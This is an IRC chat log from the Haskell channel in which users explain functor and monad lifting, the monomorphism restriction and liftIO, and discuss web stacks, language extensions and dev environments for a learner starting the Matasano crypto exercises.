06:30:09 <simukis_> silasm: There's infinite precision Rational type.
06:30:31 <dEPy> what's lifting? O_o
06:30:58 <merijn> dEPy: In the context of monad transformers?
06:31:10 <kryft> Pumping iron obviously
06:31:25 <dEPy> merijn, in general I think, I only understand reaaaaly basic Monad stuff
06:31:33 <silasm> simukis_: I meant for reals. I was doing an intro to Haskell presentation and when I told people about the Integer type they asked if there was a real-number equivalent.
06:31:59 <fizbin> dEPy: "lifting" is a generic term for taking something of type "a" and turning it into something of type "m a", where m is something vaguely like a container.
06:32:24 <fizbin> So, for example, you could say that "return" lifts a value into the monad.
06:32:37 <silasm> googling just now brought up this, which isn't exactly what I was looking for, but is interesting: http://hackage.haskell.org/package/hmpfr
06:32:53 <dEPy> fizbin, ok, I think I get this now abit :)
06:33:13 <dEPy> what about when you hear something like lifting a function?
06:33:19 <fizbin> Or you could say that fmap lifts a value of type "a->b" into a function of type "m a -> m b"
06:33:28 <merijn> dEPy: fmap "lifts" a function
06:33:31 <merijn> :t fmap
06:33:32 <fizbin> Which isn't quite the same thing, really.
06:33:33 <lambdabot> Functor f => (a -> b) -> f a -> f b
06:33:52 <merijn> dEPy: That is, it takes "a -> b" and 'lifts' it to work as "f a -> f b"
06:34:12 <dEPy> can you give me a sample ? :)
06:34:17 <fizbin> The same thing would be "a -> b" to "m (a -> b)", but "lift" is not a _precise_ technical term, but a more general one.
06:34:46 <fizbin> dEPy: Imagine the function (+1) :: Int -> Int
06:34:57 <fizbin> dEPy: This is a type error:
06:35:06 <Peaker> Is there a Monad defined of this form anywhere:    Foo m a = forall r. m r -> m (a, r)
06:35:07 <fizbin> > (+1) [3, 4, 5]
06:35:08 <lambdabot>   No instance for (GHC.Num.Num [t0])
06:35:08 <lambdabot>    arising from a use of `e_11345'
06:35:09 <lambdabot>  Poss...
06:35:26 <dEPy> aaa :)
06:35:41 <dEPy> fmap (+1) [3,4,5] makes is work on list :)
06:35:52 <silasm> > fmap (+1) Just 2
06:35:53 <fizbin> dEPy: But if we first "lift" (+1), we get:
06:35:54 <lambdabot>   No instance for (GHC.Num.Num (Data.Maybe.Maybe a0))
06:35:54 <lambdabot>    arising from a use o...
06:36:10 <fizbin> > (fmap (+1)) [ 2, 3, 4 ]
06:36:11 <lambdabot>   [3,4,5]
06:36:15 <Mortchek> > fmap (+1) (Just 2)
06:36:17 <lambdabot>   Just 3
06:36:55 <fizbin> (I added extra parens to focus on the idea that fmap was having an effect on (+1); they aren't needed)
06:37:03 <silasm> Mortchek: parentheses, how do they work.
06:37:05 <dEPy> So lifting depends on the context really?
06:37:26 <merijn> dEPy: Yes
06:37:33 <fizbin> The term "lift" is not precise, and the context is needed to make it clear.
06:37:44 <Mortchek> silasm, you wrote (((fmap (+1)) Just) 2)
06:37:54 <dEPy> what is then lift regarding to monads?
06:37:59 <fizbin> Note that there are many different functions whose names begin with "lift".
06:38:00 <silasm> Mortchek: yeah, I get it heh. I just derped.
06:38:07 <fizbin> :t liftM2
06:38:09 <lambdabot> Monad m => (a1 -> a2 -> r) -> m a1 -> m a2 -> m r
06:38:14 <fizbin> :t liftM
06:38:16 <lambdabot> Monad m => (a1 -> r) -> m a1 -> m r
06:38:24 <fizbin> :t liftM3
06:38:25 <lambdabot> Monad m => (a1 -> a2 -> a3 -> r) -> m a1 -> m a2 -> m a3 -> m r
06:38:55 <dEPy> So basically the same things, taking a function which operates on values and making it operate on monadic values?
06:39:02 <fizbin> You could continue that pattern and consider "liftM" to really be "liftM1" and return to be "liftM0"
06:39:12 <fizbin> dEPy: yes.
06:39:51 <dEPy> Any examples?:)
06:40:17 <fizbin> Because of historic accidents that mean the relationship between Applicative and Monad isn't what it should be, there's also a family of "liftA" functions that do the same thing, but for Applicatives.
06:40:19 <dEPy> Prefferable with some simple monad likes maybe. :)
06:40:25 <Mortchek> > liftM2 (+) [1, 2, 3] [4, 5, 6]
06:40:27 <lambdabot>   [5,6,7,6,7,8,7,8,9]
06:40:45 <fizbin> > liftM2 (++) (Just "herp") (Just "derp")
06:40:47 <lambdabot>   Just "herpderp"
06:41:02 <fizbin> > liftM2 (++) Nothing (Just "derp")
06:41:04 <lambdabot>   Nothing
06:41:54 <dEPy> Hm..
06:41:56 <fizbin> > liftM2 (+) [1, 2, 3] [100, 200, 300]
06:41:58 <lambdabot>   [101,201,301,102,202,302,103,203,303]
06:42:30 <fizbin> :t liftM2 (+) [1, 2, 3::Int]
06:42:33 <dEPy> but this is equal then to:   return "herp" >>= (\x -> Just (x ++ "derp"))   ?
06:42:33 <lambdabot> [Int] -> [Int]
06:43:12 <fizbin> > return "herp" >>= (\x -> Just (x ++ "derp"))
06:43:13 <dEPy> but a bit sugar coated?:)
06:43:15 <lambdabot>   Just "herpderp"
06:43:33 <fizbin> dEPy: I think a better translation (even though that got the right answer) is:
06:44:11 <Taneb> I'm messing with type algebra (because I'm bored) and discovered that Free Pair () seems worryingly golden-ratio-ish
06:44:25 <dEPy> I mean, the right question would be actually, when to use bind and when lift ? (keep in mind I'm a monad newbie)
06:44:41 <Taneb> Well, data Thing = Leaf | Branch Thing Thing
06:44:59 <merijn> dEPy: You should always prefer lift over bind
06:45:17 <merijn> "liftM2 (++)" is much cleaner to read than the other example you gave, no?
06:45:35 <fizbin> > return (++) >>= (\f -> (return "herp" >>= (\x -> (return "derp" >>= (\y -> return (f x y)))))) :: Maybe String
06:45:38 <dEPy> merijn, yes it is. That's why I asked that :)
06:45:38 <lambdabot>   Just "herpderp"
06:46:19 <fizbin> dEPy: Took a while, but I think what I said there is the fuller translation of the liftM2 thing from before.
06:46:39 <Taneb> Oh, I'm wrong (I think?)
06:46:54 <Taneb> Yeah
06:46:55 <dEPy> fizbin, on the other hand, couldn't you translate that to a "do" ?:)
06:46:57 <Taneb> That's a relief
06:47:23 <Mortomesleeping> Do notation considered harmful.
06:47:33 <dEPy> O_o
06:47:35 <quchen> Yeah, no.
06:47:54 <fizbin> > do { f <- return (++); x <- Just "herp"; y <- Just "derp"; return (f x y)}
06:47:56 <lambdabot>   Just "herpderp"
06:47:59 <fizbin> Yeah, okay.
06:48:05 <fizbin> It looks better in do notation.
06:48:06 <merijn> dEPy: You can, but then you need to introduce variable names for everything
06:48:17 <merijn> dEPy: Sometimes it's nicer to not have to invent variable names
06:48:17 <dEPy> true dat :)
06:48:22 * Mortchek hands a book to Mortomes
06:48:45 <fizbin> > liftA2 (+) (ZipList [1,2,3]) (ZipList [100,200,300])
06:48:46 <lambdabot>   No instance for (GHC.Show.Show (Control.Applicative.ZipList c0))
06:48:46 <lambdabot>    arising...
06:48:53 <quchen> fizbin: However, if you simplify that using the Monad laws you get "return ("herp" ++ "derp")" out without computing anything. :-)
06:49:13 <donri> > Just "herp" <> Just "derp"
06:49:15 <lambdabot>   Just "herpderp"
06:49:17 <absence> dEPy: when you can write something in different ways (lift, bind, do, ...) pick the one that's easiest to read/understand
06:49:21 <fizbin> Oh, seriously? ZipList has no Show instance?
06:49:30 <quchen> fizbin: getZipList
06:49:50 <fizbin> quchen: Yeah, but WTF is up with ZipList not having a Show instance?
06:50:06 <fizbin> > getZipList $  liftA2 (+) (ZipList [1,2,3]) (ZipList [100,200,300])
06:50:08 <lambdabot>   [101,202,303]
06:50:17 <quchen> fizbin: I'll add it to my list of small changes to propose to Base. :-)
06:50:19 <_just> @type (<>)
06:50:21 <lambdabot> Monoid m => m -> m -> m
06:50:23 <monoidal> http://hackage.haskell.org/trac/ghc/ticket/5787 - a volounteer is wanted
06:50:26 <_just> nice
06:50:29 <dEPy> :t liftA
06:50:31 <lambdabot> Applicative f => (a -> b) -> f a -> f b
06:50:36 <merijn> fizbin: liftA2 with ZipList is just zipWith :p
06:50:40 <fizbin> dEPy: That use of lift (using liftA2) can't be done in "do" notation.
06:50:55 <absence> > (++) <$> Just "herp" <*> Just "derp"
06:50:57 <lambdabot>   Just "herpderp"
06:51:03 <fizbin> merijn: Hence the name "ZipList"
06:51:17 <Sculptor> yo
06:51:51 <dEPy> fizbin, because it's for applicatives right?
06:51:53 <fizbin> dEPy: Remember how I said there were lots of functions whose names began with "lift*"? Thing is, the whole "lift a function" concept really belongs to Applicative.
06:52:50 * elliott would say Functor is a more fundamental idea of just "lifting a function", and Applicative is a more elaborate form of it
06:52:59 <fizbin> dEPy: If the basic typeclasses could be completely scrapped and redone, all Monads would be Applicatives. That they aren't is historic accident.
06:53:20 <dEPy> fizbin, that I knew. Because of LYAH :)
06:54:11 <fizbin> elliott: Yeah. Functor says "can lift a single-parameter function". Applicative says "can lift an arbitrary-parameter function" (including "can lift a constant/zero-param function")
06:55:01 <monoidal> I think of applicative as lifting 0- and 2-tuples: return () and liftA2 (,)
06:55:09 <donri> that's not what applicative says, that's incidental
06:55:42 <monoidal> it's a monoidal functor. bit like haskell monad is category-theoretically a Kleisli tuple but everyone refers to it as a monad.
06:55:45 <elliott> well, it's close enough.
06:56:26 <elliott> the fact that we get Applicative working with (->) because of the details of Hask biases it even more to the function lifting POV
06:56:54 <fizbin> donri: Well, the Applicative definition depends on Functor and defines two methods: one lifts constants/zero param functions (pure) and the other reduces the problem of lifting an n-param function to the problem of lifting an (n-1)-param function, for n >= 2.
06:57:54 <elliott> it's also true that you can rewrite any applicative expression as f <$> p0 <*> p1 <*> ... <*> pN, where no pI is pure x
06:58:04 <elliott> modulo some details about how you can actually do infinite trees and stuff because Haskell is weird.
06:58:40 <fizbin> :t (<*>)
06:58:41 <lambdabot> Applicative f => f (a -> b) -> f a -> f b
06:59:16 <Peaker> apparently Foo m a = forall r. m r -> m (a, r)     is an Applicative, but not a Monad
06:59:26 <fizbin> :t (<*>) . pure
06:59:27 <lambdabot> Applicative f => (a -> b) -> f a -> f b
07:02:43 <fizbin> @pl \f x y z -> f <$> x <*> y <*> z
07:02:43 <lambdabot> (. (((<*>) .) . (<*>))) . (.) . (.) . (<$>)
07:02:55 <absence> ew
07:03:06 <fizbin> @pl \f x y -> f <$> x <*> y
07:03:06 <lambdabot> (. (<*>)) . (.) . (<$>)
07:03:50 <fruitFly> I want to create a hex to base64 converter; is there any files with the binary to base64 conversion or any tools in haskell that can help me write this succintly? 'm just not exactly where to start yet. And I only have http://ideone.com/ for development for the time being; will that suffice? What does it lack compared to local development?
07:03:53 <fizbin> @pl \f x y z w -> f <$> x <*> y <*> z <*> w
07:03:53 <lambdabot> (. (((((<*>) .) . (<*>)) .) . (<*>))) . (.) . (.) . (.) . (<$>)
07:04:41 <DMcGill> fizbin: liftA2
07:04:46 <DMcGill> :t liftA2
07:04:47 <lambdabot> Applicative f => (a -> b -> c) -> f a -> f b -> f c
07:04:53 <DMcGill> :t liftA3
07:04:55 <lambdabot> Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d
07:05:16 <DMcGill> I don't know what number it goes up to
07:05:21 <fizbin> Yeah, sure. I'm trying to figure out the pattern in defining liftA* from <$> and <*>
07:09:32 <fizbin> fruitFly: yt?
07:09:43 <`Jake`> fizbin: he's offline
07:09:52 <`Jake`> unless he came back
07:10:34 <fizbin> If fruitFly comes back, tell him it appears that ideone.com is missing the packages I would grab for pre-done base64 encoding, but it shouldn't be too hard to roll his own.
07:11:17 <`Jake`> I don't think my irc client will show me a message when he comes back
07:11:47 <quchen> @tell fizbin Use Lambdabot!
07:11:48 <lambdabot> Consider it noted.
07:12:34 <fizbin> @tell fruitFly It appears that http://ideone.com/¬†is missing the packages I would grab for pre-done base64 encoding, but it shouldn't be too hard to roll your own.
07:12:34 <lambdabot> Consider it noted.
07:17:09 <klrr> i get some really strange errors, anyone got an idea what ive done wrong? http://hpaste.org/87490
07:19:58 <acube> klrr: What are those errors you get?
07:21:28 <mauke> trying to use putStrLn in a different monad
07:23:25 <acube> kllr: you need to wrap your putStrLn calls in liftIO, like: liftIO (putStrLn x) >> ...
07:24:38 <Botje> klrr: they are not strange errors. Haskell is complaining that you're trying to use an IO action in a ErrorT ... IO stack.
07:25:03 <Botje> klrr: liftIO lifts your IO actions to ErrorT ... IO actions, which is what the haskell compiler expects
07:25:13 <klrr> Botje: oh thanks!
07:40:59 <`Jake`> I followed the instructions on http://www.haskell.org/haskellwiki/Gtk2Hs/Installation and installed libghc-gtk-dev (I'm on Ubuntu), but ghc tells me that the module Graphics.UI.Gtk can't be found. That's probably because it's for ghc 7.6 and I have Haskell Platform with ghc 7.4. Can I still use it the package, or do I have to build it from source?
07:41:29 <`Jake`> s/it the package/the package/
07:41:46 <Kinnison> the package is for the ghc installed from packages
07:41:51 <Kinnison> if you're not using that, you'll need your own build
07:42:20 <`Jake`> ok, thanks.
07:49:11 <Rotaerk> anyone familiar with the "Mailbox Processor" in F#?  Is there anything like that in haskell?
07:53:57 <Rotaerk> it's effectively a separate thread running a loop that pops items off a queue and processes them, while other threads can push items onto the queue... the items can also carry channels for communicating back to the thread that pushed the item onto the queue (which might be waiting for something to arrive on the feedback channel)
07:58:47 <Cale> Rotaerk: That sounds relatively easy to implement in terms of Chan
07:59:02 <Cale> Rotaerk: But I don't know of a library which abstracts it away.
07:59:15 <Rotaerk> Chan.. k; thanks
08:01:21 <fizbin> @tell fruitFly http://ideone.com/FjbXBh
08:01:21 <lambdabot> Consider it noted.
08:15:02 <Desheng> so the new ghc compiles for iOS? is android support also in the works?
08:15:30 * hackagebot NetSNMP 0.3.0.2 - Bindings for net-snmp's C API for clients  http://hackage.haskell.org/package/NetSNMP-0.3.0.2 (PavloKerestey)
08:15:53 <Desheng> I remember some roundabout explanation of how Haskell is somehow incompatible with android by some design feature of android
08:17:50 <geekosaur> not exactly incompatible, just somewhat difficult. (most system services only provide Java APIs, so you really want to be working in Java and not native ARM code, or use a Java wrapper and complex linkage to do your FFI by passing it to the wrapper)
08:18:18 <geekosaur> s/Java/"JVM" Dalvik/
08:18:52 <Desheng> couldn't you compile Haskell to dalvik bytecode?
08:19:28 <Desheng> kinda like it were scala but not
08:19:41 <simpson> Sounds tricky.
08:20:03 <neurocyte> Desheng, ghc can cross compile to Android native code just fine.
08:20:04 <geekosaur> in theory yes. nobody's done the work; the closest you currently get is Frege. note also that neither the JVM nor Dalvik is particularly well suited to Haskell
08:20:30 <neurocyte> I have used FFI bindings the the Java JNI to write android apps.
08:21:23 <neurocyte> Desheng, there is a working demo android app on git hub if you want to have a look at it.
08:22:30 <Desheng> alright
08:27:32 <hpaste> yzb3 pasted ‚Äúxor (en/de)coding‚Äù at http://hpaste.org/87496
08:32:43 <Rags_> let's say I want to build a superfast webapp in haskell, what is the ecosystem -> I am thinking Snap, Blaze for html, what database and what javascript for frontend stuff?
08:35:12 <simpson> Rags_: Well, that varies from person to person.
08:35:19 <simpson> Rags_: I mean, I'd say Pg for the database, and no JS.
08:36:20 <Rags_> simpson: why do say no JS? i agree with Postgre
08:37:07 <acowley> Rags_: I'd be biased towards http://hackage.haskell.org/package/jmacro for JS, but I haven't used it
08:37:21 <xplat> js is slow, don't use it
08:37:51 <xplat> and most especially don't let your embedded ads use it
08:38:20 <simpson> Rags_: Well, do you want the long answer or the short answer? The short answer is [] + []
08:39:31 <Rags_> simpson: sorry, i didn't get [] + []
08:40:13 <xplat> even though the engine guys have put 90% of their optimization effort into speeding up js over the last several years, pure-html sites are still blazing fast compared to js sites
08:40:40 <simpson> Rags_: In Python, you get []. What do you get in JS? >:3
08:40:49 <acowley> Is there any movement to make some of the more common language extensions standard?
08:40:51 <simukis_> instead of not using, use it with caution. Of course that makes you to not use various libraries like jQuery and whatnot
08:42:49 <merijn> acowley: Maybe in the next report, but I wouldn't hold your breath
08:42:58 <acowley> :((((
08:43:00 <xplat> as i type these very words, i have one of these dreaded 'Warning: Unresponsive script' windows up
08:43:05 <acowley> My LANGUAGE blocks are getting ridiculous
08:43:19 <NihilistDandy> Is Warp still the fastest server for this kind of thing?
08:43:21 <simpson> acowley: Like what? A handful were added to Haskell 2010.
08:43:23 <ozataman> Rags_: you can try Fay for JS code generation
08:43:45 <acowley> at the very least, FlexibleContexts, FlexibleInstances, and MultiParamTypeClasses
08:44:04 <simpson> Ah. Yeah, MPTCs should really get added sometime soon.
08:44:21 <xplat> MultiParamTypeClasses has got to be the most awkward extension name
08:44:23 <acowley> then I'd like a shorthand for all the cool stuff like DataKinds, GADTs, ScopedTypeVariables, TypeFamilies
08:45:01 <elliott> I don't think MPTCs are appropriate for the standard
08:45:12 <elliott> because you really want FDs or TFs to make good use of them
08:45:20 <xplat> disqus again, should have known
08:45:34 <simpson> Well, aren't fundeps destined to get standardized as soon as enough white papers are written on them? :3
08:46:00 <NihilistDandy> xplat: Use ghostery.
08:46:05 <elliott> I don't think they're well understood enough.
08:46:10 <elliott> their semantics has changed recently, even
08:46:14 <acowley> elliott: I think there are uses that don't involve FDs or TFs. You can probably work around it, but I'm not sure that's preferable in all cases
08:46:43 <elliott> acowley: I think those use-cases are rare enough for conservatism to be advisable here... something like rank2types would be a much easier sell (to me)
08:46:51 <xplat> NihilistDandy: ghostery these days is almost as slow as the scripts it strips
08:46:59 <acowley> elliott: Isn't that deprecated?
08:47:20 <xplat> anyway i'd like disqus to run once, to load the comments, and then not go 'on patrol'
08:47:31 <elliott> acowley: ok, ok, RankNTypes
08:47:42 <NihilistDandy> xplat: Really? I haven't had any trouble with it. Much less than with AdBlock, anyway. Though I should see how pentadactyl's adblocker works, probably
08:47:43 <acowley> elliott: Well, I'd like RankNTypes, too
08:47:49 <xplat> fully on and fully off both suck
08:48:02 <acowley> Here's another option
08:48:08 <NihilistDandy> Yeah, disqus is a pain
08:48:28 <acowley> let me define custom LANGUAGE pragmas in a cabal file that I can use in source files. That way not every source file gets the same pragmas, but I don't have so much duplication.
08:49:41 <xplat> without MPTCs you can't even write a decent MTL
08:49:51 <elliott> mptcs aren't enough for a decent mtl
08:49:57 <elliott> you need mptcs+fds or tfs
08:50:07 <xplat> true
08:50:19 <simukis_> uhm, how can one split function signatures into several lines? `a, b, c :: Type` to `a, b, \nc :: Type` for example. Simply spliting fails to parse. Putting parens around `a, b, c` fails too.
08:50:51 <NihilistDandy> I wonder how hard it would be to add LANGUAGE aliases
08:50:56 <simukis_> parens around the whole signature fails as well.
08:51:07 <simpson> simukis_: I have a feeling that indenting the second line will make it parse.
08:51:31 <simukis_> simpson: Oh, it worked. Thanks.
08:51:31 <simpson> simukis_: But seriously, just don't clump so much onto one line. How long is your type, anyway?
08:51:59 <xplat> and if it's too long, why not make an alias?
08:52:03 <simukis_> simpson: It's not the type, there's just a lot of functions with type `Parsec Whatever`
08:52:16 <simpson> simukis_: Ah.
08:58:46 <dEPy> halp!     let plus2 = fmap (+2)       how do I tell this piece of code that I will use it for my implementation of Pair  ?
08:59:01 <dEPy> in ghci
08:59:12 <Botje> dEPy: you don't need to. just declare the type to be general.
08:59:30 <dEPy> Botje, I have literaly no idea what you just told me :D
09:00:11 <dEPy> It says I need type signature, what if I want to do that in ghci?
09:00:12 <acowley> :t fmap (+2)
09:00:18 <lambdabot> (Functor f, Num b) => f b -> f b
09:00:29 <merijn> dEPy: Why would you need to tell it that it should work for your Pair implementation?
09:00:38 <Botje> dEPy: or don't omit the argument.
09:00:41 <Botje> Prelude> let plus2 x = fmap (+2) x
09:00:45 <Botje> gives type
09:00:45 <Botje> plus2 :: (Functor f, Num b) => f b -> f b
09:00:46 <merijn> dEPy: As long as you define a Functor instance for Pair that should be fine
09:01:06 <Botje> dEPy: or you define plus2 in a file and give it a type sig there.
09:01:11 <dEPy> oh, Botje yes that works, how come it doesn't work without that?
09:01:26 <dEPy> shouldn't that be auto curried or something?
09:01:26 <geekosaur> @where DMR
09:01:27 <lambdabot> http://www.haskell.org/haskellwiki/Monomorphism_restriction
09:01:30 <Botje> dEPy: *clears throat* The Dreaded Monomorphism Restriction
09:01:38 <dEPy> O_Ù
09:01:39 <merijn> dEPy: I think that's just an oddity from DMR and the way ghci implements let
09:01:52 <geekosaur> also monolocalbinds, yes
09:02:06 <merijn> dEPy: I always recommend just editing source files in a normal editor and then making use of :l and :r
09:02:13 <Botje> dEPy: basically, ghci likes to pick the most concrete types it can.
09:02:16 <dEPy> Every answer to my question produces like 5 another questions. It scales very quickly... O_Ù
09:02:31 <dEPy> merijn, I was just curious :)
09:02:47 <Botje> dEPy: do the following experiment
09:02:52 <Botje> dEPy: ask ghci the type of (+1)
09:02:57 <Botje> dEPy: and then let x = (+1)
09:03:00 <Botje> and ask the type of x.
09:03:24 <Botje> you'll see that x is not Num a => a -> a but Integer -> Integer
09:03:26 <dEPy> O_Ù  what kind of sorcery is this?
09:03:32 <Botje> welcome to the DMR :)
09:03:36 <acowley> The DMR is often handy for interactive things
09:03:40 <Botje> 18:02 < Botje> dEPy: basically, ghci likes to pick the most concrete types it  can.
09:03:50 <Botje> that's the answer you'll understand, for now
09:03:58 <Botje> (or should be able to :P)
09:04:43 <dEPy> So, what was ghci trying to do when I told him:  let plus2 = fmap (+2)   ?
09:05:49 <Botje> dEPy: it was trying to pick the most concrete type for both the functor fmap is working over, and the Num + is owrking over.
09:06:26 <dEPy> And then it said "fuck you, you do that for me!"  ?
09:06:47 <Botje> dEPy: basically, yes
09:07:07 <Botje> but, if you add the argument to plus2, it cannot decide anything anymore, as teh type depends on that argument.
09:07:15 <geekosaur> "I'm not smart enoigh to figure this out, give me a hint?"
09:07:22 <dEPy> Botje, got it
09:08:18 <FreeFull> How would I convert from Float to CFloat?
09:09:23 <acowley> realToFrac
09:10:06 <FreeFull> Thanks
09:10:17 <FreeFull> Trying to compile frag
09:20:00 <ryant50001> hey guys, are nightly builds available somewhere? when i go to http://www.haskell.org/ghc/dist/current/dist/ it's empty
09:20:25 <mike4_> this channel gets quite sometimes. hmm
09:20:34 <mike4_> quiet*
09:21:01 <tac> > repeat "SILENCE"
09:21:04 <lambdabot>   ["SILENCE","SILENCE","SILENCE","SILENCE","SILENCE","SILENCE","SILENCE","SIL...
09:21:40 <Shou> kill the silence
09:22:37 <NihilistDandy> > repear "WORSHIP IT"
09:22:41 <NihilistDandy> > repeat "WORSHIP IT"
09:22:41 <lambdabot>   Not in scope: `repear'
09:22:42 <lambdabot>  Perhaps you meant one of these:
09:22:42 <lambdabot>    `repeat' (import...
09:22:45 <lambdabot>   ["WORSHIP IT","WORSHIP IT","WORSHIP IT","WORSHIP IT","WORSHIP IT","WORSHIP ...
09:23:10 <NihilistDandy> That would have been better if I hadn't messed it up
09:25:17 <dEPy> how do you check if something is a Functor or Applicative?
09:25:30 <acowley> :i
09:25:46 <dEPy> oh nic
09:25:48 <dEPy> tnx :)
09:27:26 <sbwhitecap> > id 1
09:27:30 <lambdabot>   1
09:27:56 <Taneb> sbwhitecap: what did you think it would do
09:28:11 <scriptor> "1"
09:28:38 <sbwhitecap> nothing
09:28:40 <monochrom> eh? experiments are fine. if anything, programmers experiment too little
09:33:57 <mrwonko> Hello. After having had a brief introduction to Haskell at Uni I'm currently learning me a haskell for great good because we didn't have enough time to go into everything, especially not Monads.  Once I'm done with that, what would be a nice medium-sized project to see how FP is superior to the OOP coding I'm used to? I have an interest in making games, so maybe I should look into that?
09:36:16 <ocharles> mrwonko: maybe you should. Gloss is a nice library for game programming
09:37:19 <dmj> what does the ST in Control.Monad.ST stand for
09:37:29 <dmj> stay?
09:37:36 <mm_freak> State Thread
09:37:36 <acowley> state thread
09:37:38 <Taneb> State thread, I think
09:38:02 <Taneb> Answered three times for three times the certainty!
09:38:26 <tsinnema> i vaguely remember it being 'state transformer'
09:38:37 <dmj> thanks * 3
09:38:53 <tsinnema> though i suppose there's no reason it couldn't stand for both
09:39:01 <monochrom> it does not transform. neither senses of the word.
09:39:14 <elliott> I think it actually does stand for "state transformer" for some reason
09:39:31 <mm_freak> "strict state threads"
09:40:29 <hpaste> yzb3 annotated ‚Äúwords'‚Äù with ‚Äúwords' (annotation) (annotation)‚Äù at http://hpaste.org/87485#a87498
09:41:08 <fruitFly> I want to create a hex to base64 converter; is there any files with the binary to base64 conversion or any tools in haskell that can help me write this succintly? I'm just not exactly sure where to start yet. And I only have http://ideone.com/ for development for the time being; will that suffice? What does it lack compared to local development?
09:41:08 <lambdabot> fruitFly: You have 2 new messages. '/msg lambdabot @messages' to read them.
09:41:40 <mm_freak> fruitFly: doing the matasano challenge? =P
09:42:45 <fruitFly> mm_freak: yes... I want to start. I don't have a dev environment setup yet. I'm cycle touring most of the days with just a friends mac 10.5.8 laptop. Can I dev on codepad.org?
09:42:49 <bgamari> fruitFly, you may want to look at base64-bytestring
09:43:01 <mm_freak> fruitFly: i just wrote a simple ByteString -> Builder function
09:43:02 <fruitFly> mm_freak: codepad.com
09:43:08 <bgamari> @hackage base64-bytestring
09:43:08 <lambdabot> http://hackage.haskell.org/package/base64-bytestring
09:43:24 <mm_freak> fruitFly: don't make your code public though
09:44:19 <dmj> this might be a weird stated question. Going through bos's stanford lectures. Phantom types, which they define as "type params on the left never used on the right" are they a hack? Can they be remedied by using forall.a
09:44:24 <fruitFly> mm_freak: yes, because I should not share answers ;) . But will I have access to everything in ideone.com? modules, correct versions etc.?
09:44:34 <fruitFly> bgamari: Thanks :)
09:44:37 <mm_freak> dmj: no hack
09:44:48 <mm_freak> data MyType x = C Int
09:44:54 <mm_freak> x is a phantom type there
09:44:58 <monochrom> forall.a does a different thing
09:45:29 <mm_freak> fruitFly: i assumed that i shouldn't use ready-made implementations for the challenge questions
09:45:39 <mm_freak> but i do use ready-made design patterns and low level stuff
09:46:07 <sbwhitecap> @hackage STMonadTrans
09:46:08 <lambdabot> http://hackage.haskell.org/package/STMonadTrans
09:46:10 <dmj> mm_freak: In his example he puts a wrapper around IORef and uses a phantom type to track wether or not he can write to it. newtype Ref t a = Ref (IORef) a, just sounds like there would be a better way to do this kind of thing
09:46:21 <mm_freak> i guess how much existing code you use is up to you and at some point they will reject your solution as "sorry, your code is copy-pasted"
09:46:23 <fruitFly> mm_freak: ready made implimentations like http://hackage.haskell.org/package/base64-bytestring ?
09:46:41 <FreeFull> The implementation of ST uses phantom types afaik
09:46:57 <mm_freak> dmj: there is no better way to do it, and i don't think you would want to do it another way
09:47:11 <mm_freak> dmj: the point here is to prove /statically/ that some IORefs are never written to
09:47:27 <mm_freak> dmj: example:  myFunc :: Ref t a -> IO ()
09:47:38 <mm_freak> myFunc cannot write to the IORef
09:47:51 <mm_freak> because it promises to work "for all" t
09:48:00 <fruitFly> mm_freak: Do I have access to everything in ideone.com? modules, packages, correct versions etc. Can I do the challenges exclusively online? and develop to a significant degree?
09:48:07 <mm_freak> if it wants to write it needs a more specific type:  myFunc :: Ref Writable a -> IO ()
09:48:25 <mm_freak> fruitFly: i'm not familiar with ideone.com
09:48:43 <dmj> mm_freak, yea, this is why I asked whether or not you could constrain a using forall a. (TypeClass a) => a
09:49:00 <mm_freak> dmj: where?
09:49:07 <fruitFly> mm_freak: how to dev online? and did you mean I shouldn't use http://hackage.haskell.org/package/base64-bytestring for the challenges?
09:49:17 <mm_freak> dmj: i mean, what do you want to achieve?
09:49:52 <mm_freak> fruitFly: i don't use base64-bytestring‚Ä¶  as said i wrote the base64 encoder myself
09:49:57 <mm_freak> base64 :: ByteString -> Builder
09:50:01 <mm_freak> where Builder is from blaze-builder
09:50:19 <mm_freak> and correspondingly:  unbase64 :: ByteString -> Maybe Builder
09:50:20 <fizbin> fruitFly: Did you see the message I sent?
09:50:29 <fruitFly> mm_freak: blaze builder?
09:50:33 <fruitFly> fizbin:  no
09:50:47 <mm_freak> fruitFly: it's a package for building strings from chunks efficiently
09:51:07 <fruitFly> mm_freak: ooh ok thanks... will note that
09:51:08 <mm_freak> alternatively you can use the slightly slower Data.ByteString.Lazy.Builder module
09:52:00 <fizbin> fruitFly: http://ideone.com/FjbXBh
09:52:49 <fizbin> But that's something deliberately hacky. ideone.com isn't good for things much larger than that.
09:53:00 <mm_freak> fizbin: you're not helping!
09:53:26 <fruitFly> fizbin: really cool thanks I'm gonna write it myself a set of crypto code challenges to learn haskell and crypto :).
09:54:00 <fruitFly> mm_freak:  fizbin I don't have a dev environment. How do you think I should dev online?
09:54:20 <fruitFly> fizbin: oh ok... why not?
09:54:25 <mm_freak> fruitFly: you will be interested in Data.ByteString, Data.Bits and Data.Word for making the base64 encoder/decoder
09:54:29 <fruitFly> fizbin: what's better?
09:54:37 <mm_freak> Builder is strictly optional‚Ä¶  i'm just using it to speed things up
09:54:46 <fizbin> Well, probably ideone's the best you can do. Doesn't mean that ideone is a good environment.
09:55:14 <mm_freak> fruitFly: my suggestion is to set up a build environment locally ;)
09:55:20 <fruitFly> fizbin: ok thanks. :)
09:55:29 <fruitFly> mm_freak: I will as soon as I get a computer :).
09:55:36 <mm_freak> oh, i see
09:57:07 <tromp> there's also instacode.es
09:57:09 <fruitFly> mm_freak: I'm really excite :) .. not sure weather to go for nix, arch gentoo etc. :P
09:57:10 <fizbin> I wonder how far you can get using the AWS free tier and a micro Linux instance.
09:57:27 <mm_freak> fruitFly: just pick one and try it out, then pick the next
09:58:01 <tromp> i mean  instacod.es
09:58:39 <fruitFly> tromp: what is it really?
09:59:25 <tromp> oh wait, that's just for fancy displays of code?!
09:59:48 <fruitFly> mm_freak: with nix can you still get the bleeding edge like with arch?
09:59:58 <fruitFly> mm_freak: i'm total linux noob excuse me
10:04:24 <mm_freak> fruitFly: some things are more bleeding edge with nix and vice versa
10:05:22 <mm_freak> it all depends on the maintainers
10:05:24 <fruitFly> ahh interesting... I hope nix wouldn't require too much extra considering I want to focus primarily on haskell and crypto for now
10:06:30 <mm_freak> fruitFly: feel free to try it, but be prepared to read a lot
10:07:00 <mm_freak> arch is equally easy/difficult to set up, but once set up it pretty much feels like most other distributions
10:07:47 <mm_freak> (nix is probably even a bit easier to get running)
10:08:06 <mm_freak> and both are very good environments for haskell development
10:10:20 <fruitFly> mm_freak: what about bsd or smartOS etC?
